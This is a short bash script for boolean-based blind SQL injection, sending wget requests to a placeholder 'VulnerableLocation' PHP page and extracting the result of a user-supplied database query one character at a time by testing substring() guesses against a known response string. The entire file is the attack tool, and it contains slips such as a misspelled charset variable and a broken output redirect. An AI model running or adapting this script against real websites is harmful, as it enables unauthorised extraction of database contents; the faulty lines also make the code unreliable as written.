#!/bin/bash

charset=`echo {0..9} {A..Z} \. \: \, \; \- \_ \@`

export URL="http://VulnerableLocation/banddetails.php"
export truestring="We worked with them in the past."
export maxlength=$1
export query=$2

export result=""

echo "Extracting the results for $query..."

for ((j=1;j<$maxlength;j+=1))
do
    export nthchar=$j
    
    for i in $chatset
    do
        wget "$URL?band=the offspring' and substring(($query),$nthchar,1)='$i" -q -O - | grep "$truestring" & /dev/null
        if [ "$?" == "0" ]
        then
              echo Character number $nthchar found: $i
              export result+=$i
              break
        fi
    done
done

echo Result: $result
